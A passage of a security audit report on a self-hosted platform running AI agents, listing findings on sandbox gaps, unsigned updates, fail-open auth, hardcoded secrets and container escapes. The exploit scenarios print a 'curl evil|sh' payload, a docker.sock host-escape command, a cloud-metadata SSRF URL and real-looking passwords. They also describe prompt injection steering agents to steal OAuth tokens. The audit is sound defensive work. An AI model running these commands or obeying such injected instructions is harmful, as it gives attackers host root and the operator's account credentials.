- **Location:** `computer-use/mcp/tools.ts:512-528` (isPathAllowed), `944-1010` (computer_read_file)
- **Description:** The luse `computer_read_file` sandbox allows three prefixes, the first being `/home/${userSlug}/` (userSlug defaults to `'bruce'`). That whole-home allowance includes the operator's AI-provider credentials: `~/.claude`, `~/.gemini/oauth_creds.json`, `~/.kimi/credentials/*`. A computer-use agent (driven by injected on-screen/web content) can read these OAuth tokens with no further gate. `realpath` closes symlink-escape but does NOT exclude sensitive dotfiles WITHIN the allowed home.
- **Exploit Scenario:** An injected instruction (page text or crafted document) directs the agent to call `computer_read_file{path:'/home/bruce/.gemini/oauth_creds.json'}` (and `~/.claude` credential JSON). The path is inside the `/home/bruce/` prefix → `isPathAllowed` true → base64 contents returned to the model → exfiltrated via a browser/clipboard action.
- **Evidence:**
```ts
tools.ts:517-526  const allowlist = [ `/home/${userSlug}/`, LUSE_TMP_PREFIX, `${LIVOS_ROOT}/data/uploads/${userId}/` ];
                  return allowlist.some(prefix => resolved.startsWith(prefix));
tools.ts:96-99    resolveLuseUserId → default 'bruce' (DEFAULT_LUSE_USER_ID)
```
- **Recommendation:** Narrow the home prefix to a non-sensitive subtree (e.g. `/home/<slug>/Downloads`, `/home/<slug>/livos-files`) or maintain an explicit denylist of credential dirs (`.claude`, `.gemini`, `.kimi`, `.ssh`, `.config`) enforced after realpath.
- **Verifier Note:** Confirmed. `isPathAllowed` first entry is `/home/${userSlug}/`, returns true on `startsWith`, no dotfile exclusion. `computer_read_file` realpaths, runs only `isPathAllowed`, returns base64 to the model. Default slug `'bruce'`. The realpath step only closes symlink-escape OUT of home. The operator's live OAuth creds sit exactly under `/home/bruce`. Code comments label LLM file read "a jailbreak vector." High not Critical: requires first subverting the computer-use agent via injected content, but the payoff is live OAuth tokens.

---

### LIVOS-011 — update.sh pulls/builds/restarts services from GitHub with no commit pinning or signature verification
- **Severity:** High — CVSS 8.0 (`AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H`)
- **Location:** `update.sh:177,338-346,606-613` + build/restart steps
- **Description:** The day-2 deploy path (`bash /opt/livos/update.sh`, run as root) does `git clone --depth 1 https://github.com/utopusc/livinity-io.git`, rsyncs over `/opt/livos` + `/opt/liv`, runs `pnpm/npm install`, builds, and `systemctl restart`s every service. There is NO verification: no pinned SHA, no signed-tag/commit check, no checksum. `LIVOS_UPDATE_TO_SHA` is captured but only used for a log filename. Whatever HEAD the remote serves runs as root. A repo compromise, a push by any write-access account, or TLS interception of the clone yields immediate root RCE.
- **Exploit Scenario:** Attacker gains push access (stolen token, malicious contributor, repo takeover) and commits a postinstall hook or malicious dist. Next operator "Update" / update.sh run clones HEAD, runs `pnpm/npm install` (executing attacker build scripts as root) and restarts services with attacker code. No pin or signature stops it.
- **Evidence:**
```bash
REPO_URL="https://github.com/utopusc/livinity-io.git"
git clone --depth 1 "$REPO_URL" "$TEMP_DIR" || fail "Failed to clone repository"
LIVOS_UPDATE_TO_SHA=$(git -C "$TEMP_DIR" rev-parse HEAD 2>/dev/null || echo "")   # only used for log filename
```
- **Recommendation:** Pin to a signed git tag and `git verify-tag`/`verify-commit` the fetched ref against a shipped maintainer GPG key before rsync/build/restart; abort on failure. At minimum ship an expected release SHA out-of-band (signed manifest from a separate origin) and compare before doing anything destructive.
- **Verifier Note:** Verified. Unpinned clone; `LIVOS_UPDATE_TO_SHA` referenced only for log filename/JSON field, never compared. No `verify-commit`/`verify-tag`/`gpg` in the 1400-line script. Cloned tree rsynced over `/opt/livos`+`/opt/liv`, install scripts executed, services restarted. `update.ts` spawns via `sudo -n bash`, bruce has NOPASSWD:ALL → runs as root. High not Critical: requires repo compromise OR TLS MITM, not a direct unauth network attacker — standard unsigned-auto-updater risk.

---

### LIVOS-012 — Skill marketplace downloads index.js from arbitrary GitHub repos and executes it in-process with no sandbox
- **Severity:** High — CVSS 8.4 (`AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:H`)
- **Location:** `skill-registry-client.ts:131-179`, `skill-installer.ts:92-147`, `skill-loader.ts:448-461`; registry add `api.ts:1985-2011`
- **Description:** A skill install fetches `index.ts`/`index.js` from `raw.githubusercontent.com/<owner>/<repo>/<branch>/<path>/index.js` and `SkillLoader.loadSkillLazy` does a dynamic `await import(moduleUrl)` inside the liv-core process — arbitrary attacker code runs with full Node/host privileges (the process holds Redis creds, JWT secret access, AI provider keys). The only "security" is a self-declared permissions list parsed from the skill's own `SKILL.md` (validates the *markdown text*, not the code). The registry source is operator-mutable: `POST /api/skills/registries` accepts any `github.com/<owner>/<repo>` URL, so a fully attacker-controlled repo can be installed.
- **Exploit Scenario:** Attacker publishes `github.com/evil/skills` with a benign-looking `SKILL.md` and an `index.js` whose top-level body runs `child_process.exec('curl evil|sh')`. Operator (or anyone reaching the LIV_API_KEY-gated API, including the open-auth case of LIVOS-014) adds the registry and installs the skill; `loadSkillLazy` imports `index.js` and the payload executes in liv-core.
- **Evidence:**
```ts
const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${entry.path}/${file}`;
// skill-loader.ts:459-461
const moduleUrl = pathToFileURL(jsPath).href + `?t=${Date.now()}`;
const mod = await import(moduleUrl);   // executes downloaded code, no sandbox
// api.ts:1997 — any github repo accepted
if (!url.match(/github\.com\/[^/]+\/[^/]+/)) { ... }
```
- **Recommendation:** Do not `import()` untrusted downloaded code in-process. (a) Restrict registries to a pinned, signature-verified official repo; (b) run skill code in a real sandbox (separate process with seccomp/no-network, or a vm with no host bindings); (c) actually enforce declared permissions at a capability layer. Verify a signature/checksum on `index.js` before load.
- **Verifier Note:** Confirmed. Any GitHub owner/repo accepted as a registry. `downloadSkill` writes a repo-supplied `index.js` verbatim; `loadSkillLazy` `import()`s it; the module body executes on import BEFORE the `typeof mod.handler` check. Permissions are cosmetic — only verifies the operator listed self-declared names; `validateManifest` validates only markdown. High not Critical: `/api` is behind `requireApiKey` and prod has LIV_API_KEY set, so realistic vector is supply-chain/social-engineering (operator installs a benign-looking third-party skill).

---

### LIVOS-013 — docker-compose.yml from untrusted app-store repos / platform DB is run verbatim — no filtering of privileged / docker.sock / host-mount
- **Severity:** High — CVSS 8.2 (`AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`)
- **Location:** `apps.ts:496,525,624,748` + `app-repository.ts:71-91` + `app-store.ts:121-143` (addRepository) + `routes.ts:40-46`
- **Description:** App install resolves a compose template from builtin, the platform DB (`https://livinity.io/api/apps/{appId}`), or a community git repo. For the git-repo path, `AppRepository.atomicClone()` clones an operator-addable repo (`addRepository(url)`, exposed as a `privateProcedure` — any authenticated user) into the data dir; its `docker-compose.yml` is rsync'd into the app data dir and started with `docker compose up -d`. The manifest Zod schema validates only metadata — never the compose. So a compose can declare `privileged: true`, `pid: host`, `network_mode: host`, mount `/var/run/docker.sock` or `/:/host`, and LivOS runs it. Docker runs as root → any of these = container-escape to host root.
- **Exploit Scenario:** Low-priv user calls `apps.addRepository('https://github.com/evil/livinity-apps')`, installs an app whose compose mounts `/var/run/docker.sock` (or `privileged:true` + binds `/`). `docker compose up -d` launches it; the container uses the socket to start a second privileged container mounting host `/` → root on the host.
- **Evidence:**
```ts
await git.clone({fs: fse, http, url: this.url, dir: temporaryPath, depth: 1, singleBranch: true})
await $`docker compose --project-name livinity --file ${composePath} ${command} --build --detach --remove-orphans`
await $({cwd: appDataDirectory})`docker compose up -d --force-recreate`
// routes.ts:40 — addRepository is privateProcedure (authenticated user), not adminProcedure
```
- **Recommendation:** Parse the compose YAML before run and reject/strip `privileged`, `cap_add`, `pid:host`/`network_mode:host`, `userns_mode`, `security_opt: ...unconfined`, and any bind of `/var/run/docker.sock` or host paths outside the app data dir. Restrict `addRepository` to `adminProcedure` + a pinned allow-list of trusted repos. Run app containers under rootless/userns Docker.
- **Verifier Note:** Confirmed. `addRepository`/`removeRepository` are `privateProcedure`; `apps.install` is privateProcedure and falls through to `ctx.apps.install(...)` with no admin gate. `patchComposeFile` only edits ports/container_name/volume paths/GPU/env — NEVER inspects/strips privileged/network_mode/pid/cap_add/docker.sock. `validateManifest` doesn't even run the Zod schema (commented out). livinityd's user is in the docker group → docker.sock or privileged+`/:/host` = host root. High not Critical: requires an authenticated session + the community-repo/multi-user path; non-admin reaches host root.

---

### LIVOS-014 — liv-core API auth fails open when LIV_API_KEY is unset; repo-root install (env-seed.sh) never seeds LIV_API_KEY
- **Severity:** High — CVSS 8.6 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `liv/packages/core/src/auth.ts:201-207` (+183); `scripts/install/env-seed.sh:69-74`; `scripts/install/deploy-livinityd.sh:1043-1046`
- **Description:** `requireApiKey()` guards every `/api/*` route in liv-core (including the RCE-capable `/api/skills/install` + `/api/skills/registries`). But if `process.env.LIV_API_KEY` is unset it logs "running without authentication" and calls `next()` — auth fully open. The repo-root install path (`install.sh` → `env-seed.sh`) writes `/opt/livos/.env` with DATABASE_URL/REDIS_URL/JWT_SECRET_FILE but NEVER writes LIV_API_KEY. The Path A `deploy-livinityd.sh` only appends LIV_API_KEY *if* `LIVOS_API_KEY` happens to be set. On such an install, liv-core (port 3200) boots with open auth, and the skill-install code-execution endpoint is reachable with no credential by anyone who can reach the port.
- **Exploit Scenario:** Fresh box installed via the repo-root path brings liv-core up with no LIV_API_KEY → `requireApiKey` falls open. An attacker who can reach `:3200` (a host-networked app container, an SSRF pivot, or any local process) POSTs `/api/skills/registries` then `/api/skills/install` with an attacker repo → arbitrary code execution in liv-core, unauthenticated.
- **Evidence:**
```ts
// auth.ts
if (!LIV_API_KEY) { logger.warn('[Auth] LIV_API_KEY not configured - running without authentication'); next(); return; }
// env-seed.sh writes only DATABASE_URL / REDIS_URL / JWT_SECRET_FILE — no LIV_API_KEY line
// deploy-livinityd.sh:1044 (conditional)
if [[ -n "${LIVOS_API_KEY:-}" ]]; then echo "LIV_API_KEY=${LIVOS_API_KEY}" >> "$_DLD_ENV_FILE"; fi
```
- **Recommendation:** Make `requireApiKey` fail CLOSED (refuse to start / 500 all `/api` routes) when LIV_API_KEY is missing. Have `env-seed.sh` always generate `LIV_API_KEY=$(openssl rand -hex 32)` on every install path, matching the JWT/PG/Redis handling already present.
- **Verifier Note:** Verified every link. Auth fails open (module-load `LIV_API_KEY`, `next()` when falsy). Gate is global (`app.use('/api', requireApiKey)`); skills endpoints exist; `loadSkillLazy` does `await import()` = RCE. `env-seed.sh` writes no LIV_API_KEY; `deploy-livinityd.sh` only appends it when `LIVOS_API_KEY` set → default install with no `--api-key` boots open. Mitigating nuance: core binds loopback (`API_HOST || '127.0.0.1'`), so not LAN-reachable by default — exploitation requires a host-networked container / local pivot / SSRF. High (unauth RCE from co-resident containers, default repo-root install) not Critical (loopback bind).

---

### LIVOS-015 — livinityd admin daemon (port 8080) exposed to the entire LAN / UFW-open from Anywhere
- **Severity:** High — CVSS 7.3 (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`)
- **Location:** Live: Mini PC `10.69.31.68` / `192.168.20.33:8080` (WiFi LAN) — `cli.ts`; UFW rule `8080/tcp ALLOW IN Anywhere`
- **Description:** livinityd binds the admin daemon to the wildcard address (`ss` shows `*:8080`, not `127.0.0.1`), and UFW allows `8080/tcp` from Anywhere (v4 and v6). The host's WiFi interface is on a home LAN (`192.168.20.33/24`). `curl http://192.168.20.33:8080/` returns 200 serving the `<title>Livinity</title>` login UI — the full management console is reachable by any device on the home WiFi, not just loopback or the ZeroTier/Tailscale overlay. The tRPC API is auth-gated (`apps.list` → 401 unauthenticated), so this is not instant takeover, but the entire admin attack surface + login form is LAN-exposed.
- **Exploit Scenario:** An attacker who joins the home WiFi (or a compromised IoT/guest on the same /24) browses to `http://192.168.20.33:8080/`, gets the login, and attacks the auth flow (credential guessing, JWT/session weaknesses, any unauthenticated tRPC route) directly against the admin daemon — no need to be on the intended management overlay.
- **Evidence:**
```text
ss: LISTEN 0 511 *:8080 *:*  users:(("node",pid=... livinityd/source/cli.ts ... --port 8080))
UFW: 8080/tcp ALLOW IN Anywhere ; 8080/tcp (v6) ALLOW IN Anywhere (v6)
curl http://192.168.20.33:8080/ -> 200, body <title>Livinity</title>
curl http://127.0.0.1:8080/api/trpc/apps.list -> 401
```
- **Recommendation:** Bind livinityd to `127.0.0.1` (or the ZeroTier/Tailscale interface only) and let Caddy be the sole front door, OR replace `8080/tcp ALLOW IN Anywhere` with allow-from the ZeroTier (`10.69.31.0/24`) and Tailscale (`100.64.0.0/10`) ranges only.
- **Verifier Note:** Confirmed. `server/index.ts:1975` `this.server.listen(targetPort, () => {...})` — no host arg → binds all interfaces (the only `listen(…,'127.0.0.1',…)` are test files). Intended topology is Cloudflare(DNS) → Server5 relay → Mini PC via private tunnel, so direct WiFi /24 reach is unintended surface. tRPC genuinely auth-gated (`isAuthenticated` throws UNAUTHORIZED), matching the live 401, so not unauth takeover — exposes the login form + admin attack surface to every LAN host. High.

---

### LIVOS-016 — openhands container mounts `/var/run/docker.sock` — container-escape primitive
- **Severity:** High — CVSS 8.2 (`CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`)
- **Location:** Live: Mini PC `openhands` container — mount `/var/run/docker.sock -> /var/run/docker.sock`
- **Description:** The openhands container has the host Docker socket bind-mounted RW. Anyone who achieves code execution inside (openhands runs arbitrary model-driven commands by design) can talk to the host Docker daemon and start a privileged container bind-mounting host `/` → root on the Mini PC. The classic docker.sock escape. Mitigating factor: the web port is bound to `127.0.0.1:33000` (LAN-refused, loopback-only), so not directly LAN-reachable — but it is fronted by Caddy/livinityd and is an AI agent executing untrusted instructions, so the escape is one prompt-injection away.
- **Exploit Scenario:** An attacker who can drive the openhands agent (via the LivOS UI it's fronted by, or prompt injection in a task) makes it run `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh` — root on the host, full disk read/write, persistence outside the sandbox.
- **Evidence:**
```text
docker inspect openhands Mounts: /var/run/docker.sock->/var/run/docker.sock  /var/lib/docker/volumes/openhands_openhands_data/_data->/.openhands
Port: 127.0.0.1:33000->3000/tcp  (192.168.20.33:33000 -> refused; loopback -> 200)
```
- **Recommendation:** Do not mount the raw docker.sock into an AI-agent container. Use a constrained Docker-API proxy with a strict allowlist, or a rootless/sysbox runtime. Treat any agent-with-docker.sock as root-on-host.
- **Verifier Note:** Confirmed as a live-infra finding (repo does not provision openhands — manually-run container). RW host socket = canonical escape, no exploit needed. openhands' designed function is executing model-driven shell, so "code execution" is its normal mode. High not Critical: web port is loopback-only and fronted by auth, so an attacker must first drive the agent; once driven, the escape is trivial/guaranteed.

---

### LIVOS-017 — OpenDesign container mounts operator host AI credentials (~/.claude, ~/.gemini) read-write
- **Severity:** High — CVSS 8.1 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`)
- **Location:** Live: Mini PC `/open-design` — Mounts `/home/bruce/.claude → /opt/livos-clis/home/.claude (rw)` and `/home/bruce/.gemini (rw)`
- **Description:** The open-design app container bind-mounts the host operator's `/home/bruce/.claude` (containing `.credentials.json` with Claude OAuth/API tokens, perms `-rw-------`) and `/home/bruce/.gemini` READ-WRITE. This is the documented `requiresLocalAiClis` design. Any code execution inside the container can exfiltrate the operator's personal Claude/Gemini account tokens (billable, account-takeover-grade) and, because RW, overwrite/tamper with them. These are the operator's real subscription credentials, not a scoped per-app token.
- **Exploit Scenario:** OpenDesign runs claude/gemini with operator creds (by design). A malicious/prompt-injected design task reads `/opt/livos-clis/home/.claude/.credentials.json`, exfiltrates the token → attacker bills against / controls the operator's account and reads conversation history. RW additionally lets the attacker swap in their own creds to MITM future agent runs.
- **Evidence:**
```text
docker inspect /open-design Mounts:
{"Source":"/home/bruce/.claude","Destination":"/opt/livos-clis/home/.claude","Mode":"rw","RW":true}
{"Source":"/home/bruce/.gemini","Destination":"/opt/livos-clis/home/.gemini","Mode":"rw","RW":true}
$ ls -la /home/bruce/.claude/.credentials.json -> -rw-------+ 1 bruce bruce 471
```
- **Recommendation:** Mount credentials read-only (`:ro`) at minimum. Better: provision a dedicated, scoped, revocable API key for app-container use instead of the operator's personal OAuth credential; isolate per-app cred dirs. Treat any app that runs arbitrary user tasks (OpenDesign/OpenHands) as untrusted w.r.t. host secrets.
- **Verifier Note:** Confirmed by reading the implementation (mirrors LIVOS-001). `inject-local-ai-clis.ts:219-220` mounts the real cred dirs `:rw`; `grantContainerCredsAcl` setfacls them rwX for the container uid plus a default ACL. Install wiring real (`apps.ts:578-596`, `:635-642`). Docs confirm these are the operator's OWN subscription credentials, not a scoped token, naming Open Design. High not Critical: requires the app installed + code-exec inside that container; accepted-by-design trade-off of the no-broker model, but full account takeover.

---

### LIVOS-018 — LIV_API_KEY graceful-degradation disables all API auth on liv core when env var is unset
- **Severity:** Medium — CVSS 6.5 (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`)
- **Location:** `liv/packages/core/src/auth.ts:181-222`; `liv/packages/memory/src/auth.ts` (same pattern); applied at `api.ts:288`
- **Description:** `verifyApiKey` returns true and `requireApiKey` calls `next()` unconditionally when `process.env.LIV_API_KEY` is falsy, logging only a warning. `requireApiKey` is the sole gate on the entire liv-core `/api` surface, including `/api/agent/stream` (which executes tools). If LIV_API_KEY is missing/empty, the daemon serves the full agent API with no auth. Impact reduced (not Critical) because the API binds to `API_HOST` default `127.0.0.1`, so remote exploitation needs another vector (SSRF, a co-located container).
- **Exploit Scenario:** liv-core.service starts without LIV_API_KEY (env not threaded into the unit). `requireApiKey` allows every request. Any local process / loopback-reaching container / SSRF primitive at `127.0.0.1:3200` invokes `/api/agent/stream` and drives the AI agent with zero credentials.
- **Evidence:**
```ts
verifyApiKey: if (!LIV_API_KEY) return true;   // graceful degradation
requireApiKey: if (!LIV_API_KEY) { logger.warn('[Auth] ... running without authentication'); next(); return; }
index.ts:573  const apiHost = process.env.API_HOST || '127.0.0.1'
```
- **Recommendation:** Fail closed: if LIV_API_KEY is unset, refuse to start the API server (throw on boot) or reject all `/api` with 503. At minimum gate open-mode behind explicit `LIV_ALLOW_NO_AUTH=true`.
- **Verifier Note:** Confirmed. Fail-open is a genuine design flaw covering `/api/agent/stream`. De-rated to Medium by the loopback bind (`API_HOST||'127.0.0.1'`) — exploitation needs a local/SSRF vector plus a misconfigured/empty key at boot. Constant-time comparison and JWT verify are otherwise sound.

---

### LIVOS-019 — liv/core API fail-open: when LIV_API_KEY unset, ALL `/api/*` (agent execution loop, port 3200) allowed unauthenticated
- **Severity:** Medium — CVSS 7.3 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`)
- **Location:** `liv/packages/core/src/auth.ts:183, 201-207`
- **Description:** The core AI daemon's API-key middleware fails OPEN: if `LIV_API_KEY` is empty/unset, both `requireApiKey()` and `verifyApiKey()` short-circuit to allow with only a warning. liv/core (port 3200) hosts `/api/agent/stream`, `/api/tools/:name/execute`, `/api/subagents/:id/execute` — privileged endpoints driving the agent loop and shell/tool execution. The same fail-open exists in the memory service. Fail-CLOSED is correct for an agent-execution control plane.
- **Exploit Scenario:** liv-core restarted with a unit/env omitting LIV_API_KEY. Middleware logs `'[Auth] LIV_API_KEY not configured - running without authentication'` and serves every route. Any local process / host-networked container / SSRF at `127.0.0.1:3200` POSTs `/api/agent/stream` and drives the agent to run arbitrary commands.
- **Evidence:**
```ts
verifyApiKey: if (!LIV_API_KEY) return true;   // graceful degradation
requireApiKey: if (!LIV_API_KEY) { logger.warn('... running without authentication'); next(); return; }
```
- **Recommendation:** Fail-closed: refuse to bind privileged routes (exit non-zero or 503 all `/api/*`) when LIV_API_KEY is unset. Gate any fail-open behind an explicit dev-only `LIV_ALLOW_NO_AUTH=1`.
- **Verifier Note:** Confirmed code behavior, with two corrections in opposite directions: (1) fail-open is actually the DEFAULT of an install done without `--api-key` — `env-seed.sh` writes no LIV_API_KEY and `deploy-livinityd.sh` only appends it when `LIVOS_API_KEY` set; no auto-gen. (2) Strong mitigation: core binds loopback (`API_HOST||'127.0.0.1'`), so 3200 isn't network-exposed — needs a local foothold / host-networked container / SSRF. Medium (bordering High given endpoint power) for THIS system.

---

### LIVOS-020 — Hardcoded Redis password `LivRedis2024!` embedded in liv/core heartbeat-runner
- **Severity:** Medium — CVSS 5.1 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)
- **Location:** `liv/packages/core/src/heartbeat-runner.ts:223`
- **Description:** `heartbeat-runner` shells out to `redis-cli -a "LivRedis2024!" ping` with the Redis password hardcoded. The canonical installer generates a RANDOM Redis password, so on a properly-installed box this ping FAILS auth — making it both a committed-secret smell AND a functional bug (the heartbeat Redis check silently returns `''`). On any install that used this value it grants full Redis access (config keys, MCP catalog, domain config, platform api_key).
- **Exploit Scenario:** On a deployment that used `LivRedis2024!`, a loopback attacker runs `redis-cli -a LivRedis2024!` and reads/writes config keys (`liv:config:*`, `liv:mcp:config`, `livos:platform:api_key`, domain config), pivoting to platform API access and altering MCP/agent config.
- **Evidence:**
```ts
heartbeat-runner.ts:223  run('redis-cli -a "LivRedis2024!" ping 2>/dev/null'),
```
- **Recommendation:** Derive the password from `process.env.REDIS_URL` (parse the password) instead of hardcoding — every install/update call site already extracts it from REDIS_URL. Remove the literal.
- **Verifier Note:** Confirmed (git-tracked). Functional-bug verified: installer generates a random password → literal won't match → ping fails → metric reported false. This is the ONLY occurrence and is used only for a cosmetic boolean health metric (no real connection, no config leak), so the attack only lands on deployments that actually used this default — which the proper installer overrides. Per the rubric (overridden-in-prod default + loopback-only Redis) Medium is accurate.

---

### LIVOS-021 — Hardcoded platform DB password `LivPlatform2024` in committed Next.js fallbacks
- **Severity:** Medium — CVSS 5.1 (`CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)
- **Location:** `platform/web/src/lib/db.ts:4`; `platform/web/drizzle.config.ts:8`
- **Description:** The platform web tier (Server5 store UI) hardcodes a fallback Postgres connection string `postgresql://platform:LivPlatform2024@127.0.0.1:5432/platform` in both the runtime pg Pool and the Drizzle config, used when DATABASE_URL is unset. This is the `platform` DB backing the public app store (`apps` table). The sibling `platform/web/src/lib/drizzle.ts:11` correctly requires DATABASE_URL (throws if unset) — so the fallback is inconsistent. PG is bound to `127.0.0.1`, limiting remote reach.
- **Exploit Scenario:** If the web process or a drizzle migration runs without DATABASE_URL exported (CI, misconfigured unit), it connects with the repo-public `LivPlatform2024`. A local/co-located actor on Server5 reaching `127.0.0.1:5432` reuses it to read/modify the store's `apps` table (`docker_compose`, manifests, featured/verified flags) — supply-chain tampering of published app definitions.
- **Evidence:**
```ts
db.ts:4            connectionString: process.env.DATABASE_URL || 'postgresql://platform:LivPlatform2024@127.0.0.1:5432/platform',
drizzle.config.ts:8  url: process.env.DATABASE_URL || 'postgresql://platform:LivPlatform2024@127.0.0.1:5432/platform',
```
- **Recommendation:** Remove the hardcoded fallback; require DATABASE_URL and throw when absent (mirror `drizzle.ts:11`). Rotate the platform DB password if this value was ever used on Server5.
- **Verifier Note:** Confirmed by direct read. Understates exposure: `db.ts` is the PRIMARY DB module imported by ~40 routes (dominant path), and the SAME password is hardcoded in the committed PM2 unit `ecosystem.config.cjs:11` (production credential, not just a dev fallback); the relay tier commits `LivPlatform2024!` too. Held at Medium because PG is `127.0.0.1`-bound — requires a local Server5 foothold; given that, full read/write to the store `apps` table.

---

### LIVOS-022 — Builtin Portainer app ships docker.sock mount + privileged host-network DinD
- **Severity:** Medium — CVSS 7.2 (`CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`)
- **Location:** `builtin-apps.ts:150,156-165,169`
- **Description:** The builtin Portainer app mounts `/var/run/docker.sock` into the Portainer container and runs a `docker:dind` service with `privileged: true` and `network_mode: 'host'`. Anyone who reaches the Portainer UI (gated only by cookie presence per LIVOS-008) obtains full Docker control of the host and a privileged host-networked container = host root. Combined with the broken-access-control gate it is reachable by any logged-in user, not just admin.
- **Exploit Scenario:** Operator installs Portainer. A non-admin user navigates to `portainer-<owner>.livinity.io`; the cookie-presence gate lets them through. Via Portainer they exec into any container or launch a privileged container mounting host root → full host compromise.
- **Evidence:**
```ts
docker: { image: 'docker:dind', ... network_mode: 'host', privileged: true },
portainer: { ... volumes: ['${APP_DATA_DIR}/data:/data', '/var/run/docker.sock:/var/run/docker.sock'], ports: ['127.0.0.1:9000:9000'] }
```
- **Recommendation:** If Portainer must ship, restrict its subdomain to admin-only via real `forward_auth` role checking (depends on fixing LIVOS-008), and consider the Portainer Agent/socket-proxy with a constrained API surface instead of raw socket + privileged DinD.
- **Verifier Note:** Confirmed, WORSE than stated. `compose-generator.ts:39-61` copies `network_mode`/`privileged`/docker.sock verbatim. The access path: `install` is `privateProcedure`; for an already-installed app a NON-admin caller hits `installForUser`, whose `patchComposeFile` matches none of privileged/network_mode/docker.sock → they survive into the per-user compose → `docker compose up -d`. So every non-admin who installs Portainer gets a privileged host-networked container with the host docker.sock = host root, bypassing RBAC and per-user isolation — without even needing the cookie gate. Medium: requires multi-user mode + Portainer installable + non-admin install; Portainer is inherently admin-grade.

---

### LIVOS-023 — Session cookie widened to registrable parent (`.livinity.io`) — leaks the session to the shared platform host and all sibling tenants
- **Severity:** Medium — CVSS 5.4 (`AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N`)
- **Location:** `user/routes.ts:54-58` (sessionCookieDomain) and `:208-214` (cookie set)
- **Description:** To reach hyphen-sibling app subdomains (`<app>-<user>.livinity.io`), the `LIVINITY_SESSION` cookie domain is set to `.livinity.io` for any 3+ label domain. The code's own comment admits this sends the cookie to `livinity.io` / `apps.livinity.io` (the SHARED platform host on Server5) and "it leaves the box." Because the login gate (LIVOS-008) trusts mere presence of this cookie, any `*.livinity.io` host an attacker controls or can XSS/log-capture on receives a real, valid session token sufficient to pass the presence-gate on the victim's app subdomains.
- **Exploit Scenario:** User logs into `bruce.livinity.io`; the browser attaches `LIVINITY_SESSION` to every `*.livinity.io` request. If any sibling host (`apps.livinity.io`, another tenant's subdomain) is attacker-influenced or logs request headers, the attacker harvests the JWT and replays it (or sets any-value cookie per LIVOS-008) against the victim's gated subdomains.
- **Evidence:**
```ts
routes.ts:54  const parent = parts.length >= 3 ? parts.slice(1).join('.') : domain; return `.${parent}`
routes.ts:49 comment: 'a .livinity.io cookie is also sent to the shared platform host ... be aware it leaves the box.'
```
- **Recommendation:** Don't scope the auth cookie to the multi-tenant registrable parent. Move app subdomains to true dot-children (`<app>.<user>.livinity.io`) so a `.<user>.livinity.io` cookie suffices, or issue a separate per-host short-lived gate token. At minimum set the cookie `__Host-`-style (host-only) and run the gate against a validated JWT (fixing LIVOS-008).
- **Verifier Note:** Verified. Widening to `.livinity.io` confirmed; the cookie value is a real signed JWT (bearer-equivalent). LIVOS-008 dependency holds (presence-only gate). Nuance keeping it Medium: httpOnly+secure defeats plain JS XSS reading the token, so theft requires server-side header logging by an attacker-influenced `*.livinity.io` host (higher bar); the reliable vector is the presence-only gate. Cross-box leak to the shared platform on Server5 is live.

---

### LIVOS-024 — SSRF + arbitrary git-fetch in apps.addRepository (no scheme/host allowlist, non-admin reachable)
- **Severity:** Medium — CVSS 6.5 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `apps/routes.ts:40-46`; `app-store.ts:121-143`; `app-repository.ts:22-45,71-104`
- **Description:** `apps.addRepository` is a `privateProcedure` (any authenticated user) taking free-form `url: z.string()` passed straight to `AppStore.addRepository` → `AppRepository.update()`. The only validation is `isValidUrl()` = `new URL(url)` in try/catch, accepting ANY parseable URL with no scheme/host restriction. `update()` calls `git.listServerRefs({http, url})` and `atomicClone()` → `git.clone({http, url})`, issuing outbound HTTP(S) git-smart requests to the attacker-chosen host. The SAME codebase ships a proper SSRF guard for webapps (`url-validator.ts validateUrl` with `isPrivateHost()`) that is NOT applied here.
- **Exploit Scenario:** A low-priv user calls `apps.addRepository` with `url='http://169.254.169.254/latest/meta-data/iam/security-credentials/'` (cloud metadata) or `'http://10.69.31.68:8080/internal-endpoint'`. livinityd issues git-smart-HTTP GETs to that internal endpoint from inside the trust boundary; error/timing differences let the attacker port-scan and fingerprint internal services. Pointing at an attacker git host also lets the user introduce arbitrary app manifests.
- **Evidence:**
```ts
routes.ts:40  addRepository: privateProcedure.input(z.object({ url: z.string() })) ...
app-repository.ts:23  function isValidUrl(url){ try { void new URL(url); return true } catch { return false } }
app-repository.ts:74  await git.clone({ fs: fse, http, url: this.url, dir: temporaryPath, depth: 1, singleBranch: true })
app-repository.ts:101 const remoteRefs = await git.listServerRefs({http, url: this.url})
```
- **Recommendation:** Reuse `validateUrl()` from `webapps/url-validator.ts` in AppRepository's constructor: restrict to http/https and call `isPrivateHost()` to reject loopback/link-local/RFC1918 for non-admins. Better: gate `addRepository`/`removeRepository` behind `adminProcedure`.
- **Verifier Note:** Confirmed. `addRepository` is privateProcedure; only validation is `new URL()`; both `listServerRefs` and `clone` issue outbound git-smart-HTTP from privileged livinityd. The webapps SSRF guard exists and is genuinely not applied here. Medium: isomorphic-git `http` only speaks HTTP/HTTPS (no file://gopher:// gadgets); SSRF is blind/semi-blind (timing/error oracle + metadata GET) with no direct body exfil; the non-admin framing only bites with multi-user mode on, though the SSRF-from-trust-boundary holds regardless.

---

### LIVOS-025 — API key middleware fails open when LIV_API_KEY is unset (graceful degradation)
- **Severity:** Medium — CVSS 7.3 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`)
- **Location:** `liv/packages/core/src/auth.ts:182-222`
